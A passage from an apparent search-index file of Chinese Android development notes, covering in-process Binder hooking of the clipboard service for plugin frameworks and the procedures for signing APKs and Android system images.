\u56e0\u6b64\u5fc5\u987b\u662f\u4e00\u4e2a\u5b8c\u6574\u7684 asInterface \u8fc7\u7684 IInterface\u5bf9\u8c61, \u65e2\u8981\u5904\u7406\u672c\u5730\u5bf9\u8c61,\u4e5f\u8981\u5904\u7406\u4ee3\u7406\u5bf9\u8c61 // \u8fd9\u53ea\u662f\u4e00\u4e2aHook\u70b9\u800c\u5df2, \u5b83\u539f\u59cb\u7684\u542b\u4e49\u5df2\u7ecf\u88ab\u6211\u4eec\u91cd\u5b9a\u4e49\u4e86; \u56e0\u4e3a\u6211\u4eec\u4f1a\u6c38\u8fdc\u786e\u4fdd\u8fd9\u4e2a\u65b9\u6cd5\u4e0d\u8fd4\u56denull // \u8ba9 IClipboard.Stub.asInterface \u6c38\u8fdc\u8d70\u5230if\u8bed\u53e5\u7684else\u5206\u652f\u91cc\u9762 return Proxy.newProxyInstance(proxy.getClass().getClassLoader(), // asInterface \u7684\u65f6\u5019\u4f1a\u68c0\u6d4b\u662f\u5426\u662f\u7279\u5b9a\u7c7b\u578b\u7684\u63a5\u53e3\u7136\u540e\u8fdb\u884c\u5f3a\u5236\u8f6c\u6362 // \u56e0\u6b64\u8fd9\u91cc\u7684\u52a8\u6001\u4ee3\u7406\u751f\u6210\u7684\u7c7b\u578b\u4fe1\u606f\u7684\u7c7b\u578b\u5fc5\u987b\u662f\u6b63\u786e\u7684 new Class[] { IBinder.class, IInterface.class, this.iinterface }, new BinderHookHandler(base, stub)); } Log.d(TAG, \"method:\" + method.getName()); return method.invoke(base, args); }} \u6211\u4eec\u4f7f\u7528\u52a8\u6001\u4ee3\u7406\u7684\u65b9\u5f0f\u4f2a\u9020\u4e86\u4e00\u4e2a\u8ddf\u539f\u59cb IBinder \u4e00\u6a21\u4e00\u6837\u7684\u5bf9\u8c61\uff0c\u7136\u540e\u5728\u8fd9\u4e2a\u4f2a\u9020\u7684 IBinder \u5bf9\u8c61\u7684 queryLocalInterface \u65b9\u6cd5\u91cc\u9762\u8fd4\u56de\u4e86\u6211\u4eec\u7b2c\u4e00\u6b65\u521b\u5efa\u7684 \u4f2a\u9020\u8fc7\u7684\u7cfb\u7edf\u670d\u52a1\u5bf9\u8c61 \uff1b\u6ce8\u610f\u770b\u6ce8\u91ca\uff0c\u8be6\u7ec6\u89e3\u91ca\u53ef\u4ee5\u770b \u4ee3\u7801","title":"\u4f2a\u9020IBinder \u5bf9\u8c61"},{"location":"Android/Android%E6%8F%92%E4%BB%B6%E5%8C%96%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94Hook%E6%9C%BA%E5%88%B6%E4%B9%8BBinder%20Hook/#servicemanageribinder","text":"\u73b0\u5728\u5c31\u662f\u4e07\u4e8b\u5177\u5907\uff0c\u53ea\u6b20\u4e1c\u98ce\u4e86\uff1b\u6211\u4eec\u4f7f\u7528\u53cd\u5c04\u7684\u65b9\u5f0f\u4fee\u6539 ServiceManager \u7c7b\u91cc\u9762\u7f13\u5b58\u7684Binder\u5bf9\u8c61\uff0c\u4f7f\u5f97 getService \u65b9\u6cd5\u8fd4\u56de\u6211\u4eec\u4f2a\u9020\u7684 IBinder \u5bf9\u8c61\uff0c\u8fdb\u800c asInterface \u65b9\u6cd5\u4f7f\u7528\u4f2a\u9020 IBinder \u5bf9\u8c61\u7684 queryLocalInterface \u65b9\u6cd5\u8fd4\u56de\u4e86\u6211\u4eec\u4f2a\u9020\u7684\u7cfb\u7edf\u670d\u52a1\u5bf9\u8c61\u3002\u4ee3\u7801\u8f83\u7b80\u5355\uff0c\u5982\u4e0b\uff1a final String CLIPBOARD_SERVICE = \"clipboard\";// \u4e0b\u9762\u8fd9\u4e00\u6bb5\u7684\u610f\u601d\u5b9e\u9645\u5c31\u662f: ServiceManager.getService(\"clipboard\");// \u53ea\u4e0d\u8fc7 ServiceManager\u8fd9\u4e2a\u7c7b\u662f@hide\u7684Class<?> serviceManager = Class.forName(\"android.os.ServiceManager\");Method getService = serviceManager.getDeclaredMethod(\"getService\", String.class);// ServiceManager\u91cc\u9762\u7ba1\u7406\u7684\u539f\u59cb\u7684Clipboard Binder\u5bf9\u8c61// \u4e00\u822c\u6765\u8bf4\u8fd9\u662f\u4e00\u4e2aBinder\u4ee3\u7406\u5bf9\u8c61IBinder rawBinder = (IBinder) getService.invoke(null, CLIPBOARD_SERVICE);// Hook \u6389\u8fd9\u4e2aBinder\u4ee3\u7406\u5bf9\u8c61\u7684 queryLocalInterface \u65b9\u6cd5// \u7136\u540e\u5728 queryLocalInterface \u8fd4\u56de\u4e00\u4e2aIInterface\u5bf9\u8c61, hook\u6389\u6211\u4eec\u611f\u5174\u8da3\u7684\u65b9\u6cd5\u5373\u53ef.IBinder hookedBinder = (IBinder) Proxy.newProxyInstance(serviceManager.getClassLoader(), new Class<?>[] { IBinder.class }, new BinderProxyHookHandler(rawBinder));// \u628a\u8fd9\u4e2ahook\u8fc7\u7684Binder\u4ee3\u7406\u5bf9\u8c61\u653e\u8fdbServiceManager\u7684cache\u91cc\u9762// \u4ee5\u540e\u67e5\u8be2\u7684\u65f6\u5019 \u4f1a\u4f18\u5148\u67e5\u8be2\u7f13\u5b58\u91cc\u9762\u7684Binder, \u8fd9\u6837\u5c31\u4f1a\u4f7f\u7528\u88ab\u6211\u4eec\u4fee\u6539\u8fc7\u7684Binder\u4e86Field cacheField = serviceManager.getDeclaredField(\"sCache\");cacheField.setAccessible(true);Map<String, IBinder> cache = (Map) cacheField.get(null);cache.put(CLIPBOARD_SERVICE, hookedBinder); \u63a5\u4e0b\u6765\uff0c\u5728app\u91cc\u9762\u4f7f\u7528\u526a\u5207\u7248\uff0c\u6bd4\u5982\u957f\u6309\u8fdb\u884c\u7c98\u8d34\u4e4b\u540e\uff0c\u526a\u5207\u7248\u7684\u5185\u5bb9\u6c38\u8fdc\u90fd\u662f you are hooked \u4e86\uff1b\u8fd9\u6837\uff0c\u6211\u4eecHook\u7cfb\u7edf\u670d\u52a1\u7684\u76ee\u7684\u5ba3\u544a\u5b8c\u6210\uff01\u8be6\u7ec6\u7684\u4ee3\u7801\u53c2\u89c1 github \u3002 \u4e5f\u8bb8\u4f60\u4f1a\u95ee\uff0c\u63d2\u4ef6\u6846\u67b6\u4f1a\u8fd9\u4e48hook\u5417\uff1f\u5982\u679c\u4e0d\u662f\u90a3\u4e48\u63d2\u4ef6\u6846\u67b6hook\u8fd9\u4e9b\u5e72\u4ec0\u4e48\uff1f\u63d2\u4ef6\u6846\u67b6\u5f53\u7136\u4e0d\u4f1a\u505a\u66ff\u6362\u6587\u672c\u8fd9\u4e48\u65e0\u804a\u7684\u4e8b\u60c5\uff0cDroidPlugin\u63d2\u4ef6\u6846\u67b6\u7ba1\u7406\u63d2\u4ef6\u4f7f\u5f97\u63d2\u4ef6\u5c31\u50cf\u662f\u4e3b\u7a0b\u5e8f\u4e00\u6837\uff0c\u56e0\u6b64\u63d2\u4ef6\u9700\u8981\u4f7f\u7528\u4e3b\u7a0b\u5e8f\u7684\u526a\u5207\u7248\uff0c\u63d2\u4ef6\u4e4b\u95f4\u4e5f\u4f1a\u5171\u7528\u526a\u5207\u7248\uff1b\u5176\u4ed6\u7684\u4e00\u4e9b\u7cfb\u7edf\u670d\u52a1\u4e5f\u7c7b\u4f3c\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u8fbe\u5230\u63d2\u4ef6\u548c\u5bbf\u4e3b\u7a0b\u5e8f\u4e4b\u95f4\u7684\u5929\u8863\u670d\u7f1d\uff0c\u6c34\u4e73\u4ea4\u878d\uff01\u53e6\u5916\uff0c ActivityManager \u4ee5\u53ca PackageManager \u8fd9\u4e24\u4e2a\u7cfb\u7edf\u670d\u52a1\u867d\u7136\u4e5f\u53ef\u4ee5\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0fhook\uff0c\u4f46\u662f\u7531\u4e8e\u5b83\u4eec\u7684\u91cd\u8981\u6027\u548c\u7279\u6b8a\u6027\uff0cDroidPlugin\u4f7f\u7528\u4e86\u53e6\u5916\u4e00\u79cd\u65b9\u5f0f\uff0c\u6211\u4eec\u4f1a\u5355\u72ec\u8bb2\u89e3\u3002 \u559c\u6b22\u5c31\u70b9\u4e2a\u8d5e\u5427\uff5e\u6301\u7eed\u66f4\u65b0\uff0c\u8bf7\u5173\u6ce8github\u9879\u76ee understand-plugin-framework \u548c\u6211\u7684 \u535a\u5ba2 ! \u539f\u6587\u94fe\u63a5\uff1a https://weishu.me/2016/02/16/understand-plugin-framework-binder-hook/","title":"\u66ff\u6362ServiceManager\u7684IBinder\u5bf9\u8c61"},{"location":"Android/Android%E7%AD%BE%E5%90%8D%E6%80%BB%E7%BB%93/","text":"Android\u7b7e\u540d\u603b\u7ed3 signapk.jar\u4e0eeclipse export\u63d2\u4ef6\u9ed8\u8ba4\u8d4b\u4e88\u7a0b\u5e8f\u4e00\u4e2aDEBUG\u6743\u9650\u7684\u7b7e\u540d signapk.jar\u5305\u542b\u6709\u7cfb\u7edf\u6743\u9650\uff08system api, permission\uff09\uff0c\u800ceclipse export\u63d2\u4ef6\u9ed8\u8ba4\u8d4b\u4e88\u7a0b\u5e8f\u4e00\u4e2aDEBUG\u6743\u9650\u7684\u7b7e\u540d\u3002 D:\\work_feixun\\GalleryBack>java -jar signapk.jar platform.x509.pem platform.pk8 D:\\work_feixun\\Gallery2\\bin\\Gallery.apk Gallery_signed.apk \u6ce8\uff1a signapk.jar \u4f4d\u4e8e out/host/linux-86/framework/signapk.jar platform.x509.pem platform.pk8 \u4f4d\u4e8e build/target/product/security/platform.x509.pem, platform.pk8 Gallery.apk\u7684\u751f\u6210\uff0c\u5148\u5728eclipse\u4e2d\u5bf9project->clean\uff0c\u7136\u540e run ->android application.\u5728bin\u76ee\u5f55\u4e0b\u4f1a\u751f\u6210Gallery.apk\u3002 \u6700\u540e D:\\work_feixun\\GalleryBack>java -jar signapk.jar platform.x509.pem platform.pk8 D:\\work_feixun\\Gallery2\\bin\\Gallery.apk Gallery_signed.apk \u8fd9\u6837\u5305\u542b\u6709\u7cfb\u7edf\u6743\u9650\u7684\u7b7e\u540dapk\u5c31\u5b8c\u6210\u4e86\u3002 \u6211\u662f\u5728AndroidManifast\u4e2d\u6dfb\u52a0android.permission.WRITE_MEDIA_STORAGE\u65f6\u51fa\u73b0 permission is only granted to system apps. from: http://blog.csdn.net/tangmin0719/article/details/8916417 \u4e00\u3001\u4e3a\u4ec0\u4e48\u8981\u7b7e\u540d \u5f00\u53d1Android\u7684\u4eba\u8fd9\u4e48\u591a\uff0c\u5b8c\u5168\u6709\u53ef\u80fd\u5927\u5bb6\u90fd\u628a\u7c7b\u540d\uff0c\u5305\u540d\u8d77\u6210\u4e86\u4e00\u4e2a\u540c\u6837\u7684\u540d\u5b57\uff0c\u8fd9\u65f6\u5019\u5982\u4f55\u533a\u5206\uff1f\u7b7e\u540d\u8fd9\u65f6\u5019\u5c31\u662f\u8d77\u533a\u5206\u4f5c\u7528\u7684\u3002 \u7531\u4e8e\u5f00\u53d1\u5546\u53ef\u80fd\u901a\u8fc7\u4f7f\u7528\u76f8\u540c\u7684Package Name\u6765\u6df7\u6dc6\u66ff\u6362\u5df2\u7ecf\u5b89\u88c5\u7684\u7a0b\u5e8f\uff0c\u7b7e\u540d\u53ef\u4ee5\u4fdd\u8bc1\u76f8\u5f53\u540d\u5b57\uff0c\u4f46\u662f\u7b7e\u540d\u4e0d\u540c\u7684\u5305\u4e0d\u88ab\u66ff\u6362\u3002 APK\u5982\u679c\u4f7f\u7528\u4e00\u4e2akey\u7b7e\u540d\uff0c\u53d1\u5e03\u65f6\u53e6\u4e00\u4e2akey\u7b7e\u540d\u7684\u6587\u4ef6\u5c06\u65e0\u6cd5\u5b89\u88c5\u6216\u8986\u76d6\u8001\u7684\u7248\u672c\uff0c\u8fd9\u6837\u53ef\u4ee5\u9632\u6b62\u4f60\u5df2\u5b89\u88c5\u7684\u5e94\u7528\u88ab\u6076\u610f\u7684\u7b2c\u4e09\u65b9\u8986\u76d6\u6216\u66ff\u6362\u6389\u3002 \u8fd9\u6837\u7b7e\u540d\u5176\u5b9e\u4e5f\u662f\u5f00\u53d1\u8005\u7684\u8eab\u4efd\u6807\u8bc6\u3002\u4ea4\u6613\u4e2d\u62b5\u8d56\u7b49\u4e8b\u60c5\u53d1\u751f\u65f6\uff0c\u7b7e\u540d\u53ef\u4ee5\u9632\u6b62\u62b5\u8d56\u7684\u53d1\u751f\u3002 \u4e8c\u3001\u7b7e\u540d\u7684\u6ce8\u610f\u4e8b\u9879 Android \u7cfb\u7edf\u8981\u6c42\u6240\u6709\u7684\u7a0b\u5e8f\u7ecf\u8fc7\u6570\u5b57\u7b7e\u540d\u624d\u80fd\u5b89\u88c5\uff0c\u5982\u679c\u6ca1\u6709\u53ef\u7528\u7684\u6570\u5b57\u7b7e\u540d\uff0c\u7cfb\u7edf\u5c06\u4e0d\u8bb8\u5b89\u88c5\u8fd0\u884c\u6b64\u7a0b\u5e8f\u3002\u4e0d\u7ba1\u662f\u6a21\u62df\u5668\u8fd8\u662f\u771f\u5b9e\u624b\u673a\u3002\u56e0\u6b64\uff0c\u5728\u8bbe\u5907\u6216\u8005\u662f\u6a21\u62df\u5668\u4e0a\u8fd0\u884c\u8c03\u8bd5\u7a0b\u5e8f\u4e4b\u524d\uff0c\u5fc5\u987b\u4e3a\u5e94\u7528\u7a0b\u5e8f\u8bbe\u7f6e\u6570\u5b57\u7b7e\u540d\u3002 Android\u7b7e\u540d\u7684\u6570\u5b57\u8bc1\u4e66\u4e0d\u9700\u8981\u6743\u5a01\u673a\u6784\u6765\u8ba4\u8bc1\uff0c\u662f\u5f00\u53d1\u8005\u81ea\u5df1\u4ea7\u751f\u7684\u6570\u5b57\u8bc1\u4e66\uff0c\u5373\u6240\u8c13\u7684\u81ea\u7b7e\u540d\u3002\u6570\u5b57\u8bc1\u4e66\u7528\u6765\u6807\u8bc6\u5e94\u7528\u7a0b\u5e8f\u7684\u4f5c\u8005\u548c\u5728\u5e94\u7528\u7a0b\u5e8f\u4e4b\u95f4\u5efa\u7acb\u4fe1\u4efb\u5173\u7cfb\uff0c\u800c\u4e0d\u662f\u7528\u6765\u51b3\u5b9a\u6700\u7ec8\u7528\u6237\u53ef\u4ee5\u5b89\u88c5\u54ea\u4e9b\u5e94\u7528\u7a0b\u5e8f\u3002 \u7cfb\u7edf\u4ec5\u4ec5\u4f1a\u5728\u5b89\u88c5\u7684\u65f6\u5019\u6d4b\u8bd5\u7b7e\u540d\u8bc1\u4e66\u7684\u6709\u6548\u671f\uff0c\u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u7684\u7b7e\u540d\u662f\u5728\u5b89\u88c5\u4e4b\u540e\u624d\u5230\u671f\uff0c\u90a3\u4e48\u5e94\u7528\u7a0b\u5e8f\u4ecd\u7136\u53ef\u4ee5\u6b63\u5e38\u542f\u7528\u3002 \u53ef\u4ee5\u4f7f\u7528\u6807\u51c6\u5de5\u5177-Keytool and Jarsigner-\u751f\u6210\u5bc6\u94a5\uff0c\u6765\u7b7e\u540d\u5e94\u7528\u7a0b\u5e8f\u7684.apk\u6587\u4ef6\u3002 \u7b7e\u540d\u540e\u9700\u4f7f\u7528zipalign\u4f18\u5316\u7a0b\u5e8f\u3002 \u6a21\u62df\u5668\u5f00\u53d1\u73af\u5883\uff0c\u5f00\u53d1\u65f6\u901a\u8fc7ADB\u63a5\u53e3\u4e0a\u4f20\u7684\u7a0b\u5e8f\u4f1a\u5148\u81ea\u52a8\u88ab\u7b7e\u6709Debug\u6743\u9650\uff0c\u7136\u540e\u624d\u4f20\u9012\u5230\u6a21\u62df\u5668\u3002Eclipse\u83dc\u5355\u7684Window -> Preferences -> Android \u2013> Build \u4e0b\u663e\u793a\u7684\u662f\u6211\u4eec\u9ed8\u8ba4\u7684\u8c03\u8bd5\u7528\u7684\u7b7e\u540d\u6570\u5b57\u8bc1\u4e66\u3002 \u6b63\u5f0f\u53d1\u5e03\u4e00\u4e2aAndroid\u5e94\u7528\u65f6\uff0c\u5fc5\u987b\u4f7f\u7528\u4e00\u4e2a\u5408\u9002\u7684\u79c1\u94a5\u751f\u6210\u7684\u6570\u5b57\u8bc1\u4e66\u6765\u7ed9\u7a0b\u5e8f\u7b7e\u540d\uff0c\u4e0d\u80fd\u4f7f\u7528ADT\u63d2\u4ef6\u6216\u8005ANT\u5de5\u5177\u751f\u6210\u7684\u8c03\u8bd5\u8bc1\u4e66\u6765\u53d1\u5e03\u3002 \u4e09\u3001\u7b7e\u540d\u65b9\u6cd5\uff1a 1.\u4f7f\u7528Keytool \u548cjarsigner\u5de5\u5177\u7b7e\u540d\uff08\u5728jdk/bin\u76ee\u5f55\u4e0b\uff09 1.\u751f\u6210\u7b7e\u540dkeystore\uff1a \u786e\u4fdd\u7535\u8111\u4e0a\u5b89\u88c5\u4e86JDK\uff0c\u56e0\u4e3a\u6211\u4eec\u5c06\u4f7f\u7528JDK\u81ea\u5e26\u7684\u521b\u5efa\u548c\u7ba1\u7406\u6570\u5b57\u8bc1\u4e66\u7684\u5de5\u5177Keytool\u3002\u5728\u547d\u4ee4\u884c\u4e0b\u8f93\u5165\u5982\u4e0b\u547d\u4ee4\uff1a keytool -genkey -v -keystore app.keystore -alias alias_name -keyalg RSA -validity 20000 -alias \u540e\u9762\u8ddf\u7684\u662f\u522b\u540d\u8fd9\u91cc\u662falias_name -keyalg \u662f\u52a0\u5bc6\u65b9\u5f0f\u8fd9\u91cc\u662fRSA -validity \u662f\u6709\u6548\u671f\u8fd9\u91cc\u662f20000 -keystore \u5c31\u662f\u8981\u751f\u6210\u7684keystore\u7684\u540d\u79f0\u8fd9\u91cc\u662fapp.keystore \u7136\u540e\u6309\u56de\u8f66\u952e \u6309\u56de\u8f66\u540e\u9996\u5148\u4f1a\u63d0\u793a\u4f60\u8f93\u5165\u7684\u5bc6\u7801\uff1a\u8fd9\u4e2a\u5728\u7b7e\u540d\u65f6\u8981\u7528\u7684\uff0c\u8981\u8bb0\u4f4f \u7136\u540e\u4f1a\u518d\u786e\u8ba4\u4f60\u7684\u5bc6\u7801\u3002 \u4e4b\u540e\u4f1a\u4f9d\u6b21\u53eb\u4f60\u8f93\u5165\u59d3\u540d\u3001\u7ec4\u7ec7\u5355\u4f4d\u3001\u7ec4\u7ec7\u540d\u79f0\u3001\u57ce\u5e02\u533a\u57df\u3001\u7701\u4efd\u540d\u79f0\u3001\u56fd\u5bb6\u4ee3\u7801\uff08CN\uff09\u7b49\u3002 Keytool\u7684\u8be6\u7ec6\u53c2\u6570\u8bf7\u53c2\u8003\uff1a http://www.android123.com.cn/androidkaifa/173.html 2.\u7b7e\u540d\uff1a jarsigner -verbose -keystore app.keystore -signedjar app_signed.apk app.apk alias_name -keystore: keystore\u7684\u540d\u79f0 -signedjar app_signed.apk: \u6307\u5b9a\u7b7e\u540d\u540e\u751f\u6210\u7684APK\u540d\u79f0 app.apk: \u76ee\u6807APK \u7136\u540e\u6309\u56de\u8f66\uff1a\u4f1a\u8981\u6c42\u8f93\u5165\u521a\u624d\u8bbe\u7f6e\u7684\u5bc6\u7801\uff0c\u8f93\u5165\u540e\u6309\u56de\u8f66\u5c31\u5f00\u59cb\u7b7e\u540d\u4e86\u3002 3.\u67e5\u770b\u7b7e\u540d\uff1a jarsigner -verify app_signed.apk \u67e5\u770b\u662f\u5426\u7b7e\u540d\uff0c\u5982\u679c\u5df2\u7ecf\u7b7e\u540d\u4f1a\u6253\u5370 \"jar verified\". jarsigner -verify -verbose -certs app_signed.apk \u67e5\u770b\u7b7e\u540d\u8be6\u7ec6\u4fe1\u606f\u3002 4.\u901a\u8fc7zipalign\u5de5\u5177\u8fdb\u884c\u4f18\u5316apk(android\u81ea\u5e26\u7684\u5de5\u5177\uff0c./build/tools/zipalign) zipalign -v 4 app_signed.apk androidres.apk # \u5bf9apk\u4f18\u5316 zipalign -c -v 4 androidres.apk # \u67e5\u770bapk\u662f\u5426\u7ecf\u8fc7\u4f18\u5316 2. \u4f7f\u7528eclipse ADT\u5de5\u5177\u7b7e\u540d \u5728Package Explorer \u7a97\u53e3\uff0c\u53f3\u952e\uff0c\u9009\u62e9Android Tools--->Export Signed Application Package \u7136\u540e\u6309\u7167\u63d0\u793a\u4e00\u6b65\u4e00\u6b65\uff0c\u751f\u6210\u5df2\u7b7e\u540d\u7684apk\u3002\u901a\u8fc7eclipse\u4e5f\u53ef\u4ee5 \u5bfc\u51fa\u672a\u7b7e\u540d\u7684APK\u6587\u4ef6\u3002 \u6ce8\uff1a\u9700\u8981\u8f93\u5165\u4e24\u6b21\u5bc6\u7801\uff0c\u7b2c\u4e00\u6b21\u662f\u79c1\u94a5\u5bc6\u7801\uff0c\u7b2c\u4e8c\u6b21\u65f6\u79c1\u94a5\u522b\u540d\u7684\u5bc6\u7801\u3002 3.eclipse \u5728debug\u6a21\u5f0f\u4e0b\u81ea\u52a8\u7b7e\u540d\uff08\u65e0\u987b\u624b\u52a8\u914d\u7f6e\uff09\uff1a \u5728debug\u6a21\u5f0f\u4e0b\u7528eclipse \u7684ADT\u4e3aandroid\u7b7e\u540d\uff0c\u53ea\u8981\u5e94\u7528\u7a0b\u5e8f\u5728eclipse\u4e0b\u5f00\u53d1\uff0c\u7cfb\u7edf\u5c31\u4f1a\u81ea\u52a8\u7ed9apk\u7b7e\u540d\u548c\u4f18\u5316\u3002 \u5728Eclipse\u4e2dWindows > Preferences > Android > Build\u53ef\u4ee5\u770b\u5230\u4f60keysotre\u7684\u4f4d\u7f6e\uff1b \u56db\u3001\u751f\u6210Android\u7cfb\u7edf\u7b7e\u540d \u4e0a\u9762\u8bb2\u7684Android\u6570\u5b57\u7b7e\u540d\u5927\u591a\u662f\u4e0eAndroid APK\u76f8\u5173\uff0c\u505aCTS \u8ba4\u8bc1\u65f6\uff0c\u9700\u8981\u7528\u5230Android\u7cfb\u7edf\u7b7e\u540d\u3002\u4e3a\u4ec0\u4e48\u9700\u8981\u7ed9Android\u7cfb\u7edf\u7b7e\u4e2a\u540d\u624d\u80fd\u8fdb\u884cCTS\u8ba4\u8bc1\u5462\uff1f\u539f\u6765\u6211\u4eec\u901a\u8fc7make -j4\u7f16\u8bd1\u51fa\u6765\u7684system.img\u4f7f\u7528\u7684\u662ftest key,\u8fd9\u79cd\u7c7b\u578b\u7684key\u53ea\u9002\u7528\u4e8e\u5f00\u53d1\u9636\u6bb5\uff0c\u800c\u4e14\u8fd9\u79cd\u79d8\u94a5\u662f\u516c\u5f00\u7684\uff0c\u8c01\u90fd\u53ef\u4ee5\u4f7f\u7528\u3002\u5f53\u53d1\u5e03\u4e00\u6b3eandroid\u4ea7\u54c1\uff0c\u5c31\u9700\u8981\u53e6\u5916\u7ed9\u6574\u4e2a\u7cfb\u7edf\u7b7e\u4e2a\u540d\uff0c\u9632\u6b62\u88ab\u522b\u4eba\u76d7\u7528\u3002\u8fd9\u79cd\u7cfb\u7edf\u5c31\u662frelease\u7248\u672c\u7684Android\u7cfb\u7edf\u3002 1\u3001\u751f\u6210\u52a0\u5bc6key\u6587\u4ef6 \u8981\u5bf9Android\u7cfb\u7edf\u8fdb\u884c\u7b7e\u540d\uff0c\u9700\u8981\u751f\u6210\u56db\u79cd\u7c7b\u578b\u7684key\u6587\u4ef6\u3002 a)releasekey \uff08testkey\uff09 b)media c)shared d)platform 1\uff09\u8fdb\u5165/android_src/development/tools\u76ee\u5f55\u3002 2\uff09\u4f7f\u7528make_key\u5de5\u5177\u751f\u6210\u7b7e\u540d\u6587\u4ef6\u3002\u9700\u8981\u5206\u522b\u751f\u6210 releasekey\uff0cmedia\uff0cshared\uff0cplatform\u3002 ./make_key releasekey '/C=CN/ST=JiangSu/L=NanJing/O=Company/OU=Department/CN=Your Name/emailAddress=YourE-mailAddress' \uff08\u7cfb\u7edf\u5c06\u4f1a\u63d0\u793a\u8f93\u5165\u9488\u5bf9\u5404\u79cdkey\u7684\u5bc6\u7801\uff0c\u6309\u7167\u63d0\u793a\u8f93\u5165\u5373\u53ef\uff09 \u5c06\u4f1a\u751f\u6210 releasekey.pk8 \u548c releasekey.x509.pem\u6587\u4ef6\uff0c\u5176\u4e2d .pk8\u662f\u751f\u6210\u7684\u79c1\u94a5\uff0c\u800c .x509.pem\u662f\u516c\u94a5\uff0c\u751f\u6210\u65f6\u4e24\u8005\u662f\u6210\u5bf9\u51fa\u73b0\u7684. \u6ce8\uff1a\u5982\u679c\u51fa\u73b0 openssl : relocation error :openssl : symbol ...\u5c1d\u8bd5\u7528 sudo \u6267\u884c\u547d\u4ee4\uff0c\u95ee\u9898\u89e3\u51b3\u4e86\uff01 2.\u56de\u5230\u6839\u76ee\u5f55android_src\u3002 \u547d\u4ee4\u6267\u884c\u7684\u65f6\u5019\u90fd\u6700\u597d\u5728\u5de5\u7a0b\u7684\u6839\u76ee\u5f55\u4e0b\u6267\u884c\uff0c\u8981\u4e0d\u7136\u811a\u672c\u7528\u5230\u7684\u67d0\u4e9b\u6587\u4ef6\u627e\u4e0d\u5230\u7684\u3002 3.\u7f16\u8bd1\u7cfb\u7edf make -j4 PRODUCT-generic-user dist \u5176\u4e2dgeneric \u8868\u793a\u751f\u6210\u7684TARGET_PRODUCT\u7c7b\u578b\u4e3ageneric\uff0c user\u4ee3\u8868TARGET_BUILD_VARIANT\u4e3auser\u7248\u672c\u3002 \u7f16\u8bd1\u5b8c\u6210\u4e4b\u540e\u56de\u5728android_src/dist/\u76ee\u5f55\u5185\u751f\u6210\u4e2a product_generic-user_files \u5f00\u5934\u7684zip\u6587\u4ef6.\u8fd9\u5c31\u662f\u6211\u4eec\u9700\u8981\u8fdb\u884c\u7b7e\u540d\u7684\u6587\u4ef6\u7cfb\u7edf. 4.\u5f00\u59cb\u7b7e\u540d ./build/tools/releasetools/sign_target_files_apks -d key_directory/ out/dist/product_modul-target_files.zip out/dist/signed_target_files.zip \u901a\u8fc7 sign_target_files_apks \u811a\u672c\uff0c\u5b8c\u6210android\u7cfb\u7edf\u7684\u7b7e\u540d\u5de5\u4f5c. key_directory/ \u8868\u793akey\u6240\u5728\u7684\u76ee\u5f55\u3002 out/dist/product_modul-target_files.zip \u6e90\u6587\u4ef6\u3002 out/dist/signed_target_files.zip \u751f\u6210\u7b7e\u540d\u7684\u76ee\u6807\u6587\u4ef6\u3002 \u53ef\u80fd\u4f1a\u51fa\u73b0\uff1a ERROR: no key specified for: CalendarWidget.apk Contacts_yellowpage.apk SnsAppMain.apk \u8fd9\u8868\u793a\uff0c\u7b7e\u540d\u5e76\u6ca1\u6709\u6210\u529f,\u539f\u56e0\u662f\u7531\u4e8e\u6709\u4e9bapk\u7a0b\u5e8f\u5df2\u7ecf\u7b7e\u8fc7\u540d\u4e86\u6216\u8005\u627e\u4e0d\u5230\u5bf9\u5e94\u7684key. \u8fd9\u9700\u8981\u6211\u4eec\u5bf9apk\u8bbe\u7f6e\u8fc7\u6ee4,\u4e0d\u5bf9\u4e0a\u9762\u7684\u5e94\u7528\u8fdb\u884c\u7b7e\u540d.\u65b9\u6cd5\u5982\u4e0b: \u901a\u8fc7\u53c2\u6570\"-e =\" \u6765\u8fc7\u6ee4\u8fd9\u4e9b\u5e94\u7528. ./build/tools/releasetools/sign_target_files_apks -d key_directory/ -e CalendarWidget.apk= -e Contacts_yellowpage.apk= -e SnsAppMain.apk= -e out/dist/product_modul-target_files.zip out/dist/signed_target_files.zip \u8f93\u5165\u8be5\u547d\u4ee4\u65f6\u4f1a\u63d0\u793a\u8f93\u5165key\u7684\u5bc6\u7801\uff0c\u4f1a\u51fa\u73b0\u56db\u6b21\u5bc6\u7801\u8f93\u5165\u63d0\u793a\u3002\u5206\u522b\u4e3a\u56db\u79cd\u7c7b\u578b\u7684key\u7684\u5bc6\u7801\u3002 5.\u751f\u6210image\u6587\u4ef6 ./build/tools/releasetools/img_from_target_files out/dist/signed-target-files.zip signed-img.zip \u7528 img_from_target_files \u547d\u4ee4\u5bf9\u751f\u6210\u7684igned-target-files.zip\u6587\u4ef6\u8fdb\u884c\u6253\u5305\uff0csigned-img.zip\u5305\u542b\u4e86boot.img,userdate.img,system.img\u6587\u4ef6\u7b49. 6.\u901a\u8fc7fastboot\u4e0b\u8f7dsigned-img.zip\u6587\u4ef6 fastboot update signed-img.zip \u901a\u8fc7fastboot\u5c31\u53ef\u4ee5\u628a\u7b7e\u4e86\u540d\u7684\u7cfb\u7edf\u6587\u4ef6\u70e7\u5230\u624b\u673a\u4e0a\u4e86\u3002 \u4e94\u3001\u51e0\u4e2a\u95ee\u9898\uff1a 1.make_key \u548cKeytool\u4e24\u79cd\u65b9\u5f0f\u751f\u6210\u7684key\u6709\u4f55\u533a\u522b\uff1a Keytool \u4f4d\u4e8e%JAVA_HOME%/bin\u76ee\u5f55\u4e0b\uff0c\u7528\u4e8e\u7ba1\u7406\u5bc6\u94a5\u3001\u8bc1\u4e66\u548c\u8bc1\u4e66\u94fe\u3002JavaSE6\u4e2d\u7684Keytool\u5df2\u7ecf\u6539\u53d8\uff0c\u8fd8\u53ef\u4ee5\u7528\u6765\u7ba1\u7406\u5bf9\u79f0\u52a0\u5bc6\u7b97\u6cd5\u4e2d\u7684\u5bc6\u94a5\u3002\u5b83\u751f\u6210\u7684mykey.keystore\u5305\u62ec\u516c\u94a5\u3001\u79c1\u94a5\u548c\u8bc1\u4e66\u3002 make_key \u4f4d\u4e8esource_src/development/tools \u76ee\u5f55\u4e0b\uff0c\u901a\u8fc7\u8c03\u7528openssh\u751f\u6210\u516c\u94a5\u548c\u79c1\u94a5\uff0c\u6240\u4ee5\u751f\u6210 .x509.pem\u548c 